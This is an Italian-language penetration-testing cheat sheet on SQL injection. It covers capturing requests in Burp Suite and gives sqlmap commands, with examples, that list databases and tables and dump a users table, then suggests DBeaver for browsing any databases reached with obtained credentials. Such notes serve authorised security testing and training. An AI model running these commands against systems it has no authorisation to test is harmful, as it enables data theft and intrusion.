# SQL Injection (Linux)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `sqlmap`, `Burp Suite`, `DBeaver` |
| **SO Target** | Qualsiasi con Database (MySQL, PostgreSQL, ecc.) |
| **Quando effettuare** | Durante l'analisi di form web o parametri URL |
| **Info Utili** | Estrazione di dati, bypass login o esecuzione comandi (RCE) |

### Test Manuale e Burp Suite
Identificare i parametri vulnerabili intercettando le richieste con Burp Suite.

1. Aprire Burp Suite e intercettare la richiesta.
2. Mandare al Repeater per testare manualmente.
3. Copiare la richiesta in un file chiamato `<NAME>.req`.

### SQLMap Automatizzato
Utilizzare la richiesta salvata per automatizzare l'estrazione dei dati.

**Comando Generico:**
```bash
sqlmap -r <REQUEST_FILE> --batch
```
*Esempio:*
```bash
sqlmap -r login.req --batch
```

**Estrazione Database:**
```bash
sqlmap -r <REQUEST_FILE> --dbs
```
*Esempio:*
```bash
sqlmap -r login.req --dbs
```

**Estrazione Tabelle di un DB:**
```bash
sqlmap -r <REQUEST_FILE> -D <DB_NAME> --tables
```
*Esempio:*
```bash
sqlmap -r login.req -D users_db --tables
```

**Dump del contenuto di una tabella:**
```bash
sqlmap -r <REQUEST_FILE> -D <DB_NAME> -T <TABLE_NAME> --dump
```
*Esempio:*
```bash
sqlmap -r login.req -D users_db -T users --dump
```

### Navigazione DB (DBeaver)
Se si ottengono credenziali, [DBeaver](https://dbeaver.io/) è un tool open-source ottimo per navigare i DB graficamente.

### URL Fondamentali
- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [Hacktricks SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)
- [DBeaver Download](https://dbeaver.io/download/)
